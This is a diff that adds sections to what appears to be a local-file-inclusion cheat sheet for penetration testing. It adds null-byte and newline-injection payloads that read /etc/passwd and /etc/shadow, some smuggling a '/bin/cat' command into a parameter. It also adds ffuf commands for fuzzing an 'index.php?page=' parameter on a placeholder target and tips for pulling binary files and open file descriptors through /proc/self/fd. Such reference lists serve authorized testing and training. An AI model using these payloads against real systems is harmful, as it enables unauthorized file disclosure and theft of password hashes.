@@ -92,6 +92,18 @@ If `../` is filtered but not recursively:
 ....\/....\/....\/etc/passwd
 ```
 
+### Null-byte and alternate encodings (PHP / app-specific)
+
+Some apps accept null-byte or newline-style payloads (behavior varies by version and filters):
+
+```bash
+%00/etc/passwd%00
+%00../../../../../../etc/passwd
+%00../../../../../../etc/shadow
+%0a/bin/cat%20/etc/passwd
+%0a/bin/cat%20/etc/shadow
+```
+
 ### URL Encoding
 
 ```bash
@@ -432,10 +444,22 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-lin
 ffuf -w /path/to/LFI-WordList-Linux:FUZZ \
      -u 'http://TARGET/index.php?page=../../../../FUZZ' -fs 2287
 
+# Linux default web root paths
+ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
+     -u 'http://TARGET/index.php?page=../../../../FUZZ' -fs 2287
+
 # Windows
 ffuf -w /path/to/LFI-WordList-Windows:FUZZ \
      -u 'http://TARGET/index.php?page=..\..\..\..\FUZZ' -fs 2287
 ```
+
+**Wordlists:** `default-web-root-directory-linux.txt`; [LFI-WordList-Linux](https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux).
+
+### Reading binary files and /proc/self/fd
+
+When the LFI returns binary (e.g. database file), save raw bytes (e.g. `r.content` in a script or `curl -o file.bin`) so the file is not corrupted. You can then open it with the right tool (e.g. `sqlite3 file.bytes`).
+
+**Open file descriptors:** `/proc/self/fd/N` (e.g. 7, 9) can expose open files (e.g. SQLite DB) of the current process. Try low numbers after confirming LFI.
 
 ---
 
